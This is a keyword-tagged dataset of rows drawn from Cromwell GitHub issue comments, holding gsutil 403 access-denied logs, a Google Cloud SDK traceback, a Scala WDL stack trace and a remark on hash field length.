/mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:11914,access,access,11914,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-ac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:13168,access,access,13168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:48 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:45:48 I: Running command: sudo gsutil -h; Content-type:text/plain -q -m cp /var/log/google-genomics/*.log; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:46:18 I: Copying /var/log/google-genomics/*.log to; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_workflow/f6f01c57-23e2-4d29-854a-0d39c11ff950/call-generate_true_positives/; 2017/02/07 15:46:18 I: Running command: sudo gsutil -h; Content-type:text/plain -q -m cp /var/log/google-genomics/*.log; gs://broad-dsde-methods/lichtens/cromwell-executions-test_dl_oxoq/bamsurgeon_wor",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:14422,access,access,14422,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,2,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:41:50 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:41:50 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:3327,access,access,3327,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:4581,access,access,4581,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:5835,access,access,5835,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:7089,access,access,7089,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:8343,access,access,8343,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:9597,access,access,9597,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:10851,access,access,10851,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:12105,access,access,12105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:47 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:45:48 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:45:48 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; com",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:13359,access,access,13359,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security,"_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19ec38f93/call-M2/shard-108/\"": cp failed: gsutil -h Content-type:text/plain -q -m cp /var/log/google-genomics/*.log gs://broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full_dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19ec38f93/call-M2/shard-108/, command failed: Traceback (most recent call last):\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 75, in <module>\n main()\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/gsutil.py\"", line 22, in main\n project, account = bootstrapping.GetActiveProjectAndAccount()\n File \""/usr/local/share/google/google-cloud-sdk/bin/bootstrapping/bootstrapping.py\"", line 205, in GetActiveProjectAndAccount\n project_name = properties.VALUES.core.project.Get(validate=False)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1221, in Get\n required)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1501, in _GetProperty\n value = _GetPropertyWithoutDefault(prop, properties_file)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1539, in _GetPropertyWithoutDefault\n value = callback()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 693, in _GetGCEProject\n return c_gce.Metadata().Project()\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 104, in Project\n gce_read.GOOGLE_GCE_METADATA_PROJECT_URI)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py\"", line 155, in TryFunc\n return func(*args, **kwargs), None\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 41, in _ReadNoP",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298633044:1213,validat,validate,1213,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298633044,1,['validat'],['validate']
Security,_v1_tests.input_default_not_used.greeting; scala.collection.immutable.Map$Map1.apply(Map.scala:111); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.$anonfun$convertInnerScatter$8(ScatterElementToGraphNode.scala:103); scala.collection.immutable.List.map(List.scala:283); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.$anonfun$convertInnerScatter$7(ScatterElementToGraphNode.scala:102); cats.data.Validated.map(Validated.scala:194); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.convertInnerScatter(ScatterElementToGraphNode.scala:99); wdl.draft3.transforms.wdlom2wom.graph.ScatterElementToGraphNode$.convert(ScatterElementToGraphNode.scala:31); wdl.draft3.transforms.wdlom2wom.graph.WorkflowGraphElementToGraphNode$.convert(WorkflowGraphElementToGraphNode.scala:49); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$1(WorkflowDefinitionElementToWomWorkflowDefinition.scala:82); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.graphNodeCreationFold$1(WorkflowDefinitionElementToWomWorkflowDefinition.scala:77); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$6(WorkflowDefinitionElementToWomWorkflowDefinition.scala:88); scala.collection.LinearSeqOptimized.foldLeft(LinearSeqOptimized.scala:122); scala.collection.LinearSeqOptimized.foldLeft$(LinearSeqOptimized.scala:118); scala.collection.immutable.List.foldLeft(List.scala:86); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.$anonfun$makeWomGraph$5(WorkflowDefinitionElementToWomWorkflowDefinition.scala:88); common.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:27); wdl.draft3.transforms.wdlom2wom.WorkflowDefinitionElementToWomWorkflowDefinition$.makeWomGraph(WorkflowDefinitionElementToWomWorkfl,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3751:1624,validat,validation,1624,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3751,1,['validat'],['validation']
Security,"`HASH_VALUE` in `CALL_CACHING_HASH` is `VARCHAR(255)`, so we shouldn't have this particular problem. But given that the Docker hashes we generate are functions of Docker image names and those seem to have the potential to be very long, we might want to think about an even larger field.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240549174:127,hash,hashes,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1301#issuecomment-240549174,1,['hash'],['hashes']
